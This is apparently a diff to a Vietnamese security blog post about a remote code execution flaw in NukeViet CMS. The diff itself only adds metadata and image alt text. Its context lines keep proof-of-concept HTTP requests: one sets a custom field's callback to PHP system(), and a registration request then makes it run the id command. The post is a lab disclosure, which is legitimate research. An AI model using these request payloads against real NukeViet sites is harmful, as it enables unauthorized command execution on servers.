@@ -3,6 +3,8 @@ layout: post
 title: "Arbitrary PHP Function Call dẫn tới RCE (NukeViet)"
 date: 2026-08-30 00:00:00 +0700
 categories: [Security, PHP, RCE]
+image: "https://0xki29.github.io/blog/assets/og/nukeviet-callback-rce.png"
+tags: [rce, nukeviet, php, cms]
 ---
 
 > Tài liệu này mô tả một lỗ hổng Remote Code Execution (RCE) được phát hiện trong Module của NukeViet CMS, khai thác qua cơ chế `match_type=callback` trên trường dữ liệu tùy chỉnh (custom field). Mọi thử nghiệm được thực hiện trên môi trường lab/local do chính người viết triển khai — không nhắm vào hệ thống production của bên thứ ba.
@@ -74,7 +76,7 @@ modules/users/fields.check.php
 ```
 
 
-![](/blog/assets/field.png)
+![NukeViet source view of the custom field configuration where func_callback is defined, traced back from the call_user_func sink](/blog/assets/field.webp)
 
 
 Từ sink, trace ngược `$row_f['func_callback']` về nơi cấu hình:
@@ -87,7 +89,7 @@ modules/users/admin/fields.php
        khi tạo mới custom field (fid=0)
 ```
 
-![](/blog/assets/field2.png)
+![Custom field creation screen (fid=0) in the NukeViet admin panel where match type and callback are configured](/blog/assets/field2.webp)
         
 
 
@@ -108,7 +110,7 @@ modules/users/admin/fields.php
     └─ Không có allowlist
 ```
 
-![](/blog/assets/field1.png)
+![Execution path reaching the sink, showing there is no allowlist validating the callback function](/blog/assets/field1.webp)
 
 Execution path để kích hoạt sink:
 
@@ -119,7 +121,7 @@ modules/users/funcs/register.php
     $custom_fields = $nv_Request->get_array('custom_fields', 'post');
 ```
 
-![](/blog/assets/custom.png)
+![Registration request parameters carrying the nv_poc_rce custom field value into the $custom_fields array](/blog/assets/custom.webp)
 
 ```text
 
@@ -132,7 +134,7 @@ modules/users/funcs/register.php
 ```
 
 
-![](/blog/assets/custom1.png)
+![Captured request showing how user-supplied custom field input reaches the callback configuration](/blog/assets/custom1.webp)
 
 ```text
 
@@ -149,7 +151,7 @@ modules/users/fields.check.php
 
 ```
 
-![](/blog/assets/custom2.png)
+![Another code path reusing the same sink outside of the registration flow](/blog/assets/custom2.webp)
 
 
 Ngoài registration, cùng sink còn được sử dụng qua:
@@ -186,9 +188,9 @@ Connection: keep-alive
 save=1&fid=0&system=0&title=PoC+RCE&description=PoC&required=0&show_register=1&user_editable=1&show_profile=1&class=&field_type=textbox&field=nv_poc_rce&match_type=callback&match_callback=system&min_length=0&max_length=100&default_value=
 ```
 
-![](/blog/assets/add.png)
+![Admin panel creating the malicious custom field with match_type=callback and match_callback=system](/blog/assets/add.webp)
 
-![](/blog/assets/checking.png)
+![NukeViet validating the newly created custom field entry before saving it](/blog/assets/checking.webp)
 
 
 
@@ -232,7 +234,7 @@ Connection: keep-alive
 first_name=tesst&last_name=test&username=test01&email=hust1212%40gmail.com&password=Password123%40!&re_password=Password123%40!&gender=M&birthday=23%2F08%2F1985&sig=test&question=test&answer=test&custom_fields%5Bnv_poc_rce%5D=id&agreecheck=1&nv_seccode=2DC76F&checkss=b381411c8c8e6f6ccc860e3bbdf50517
 ```
 
-![](/blog/assets/rce.png)
+![Registration request with custom_fields[nv_poc_rce]=id triggering system() execution and returning the id command output](/blog/assets/rce.webp)
 
 Server thực thi:
 
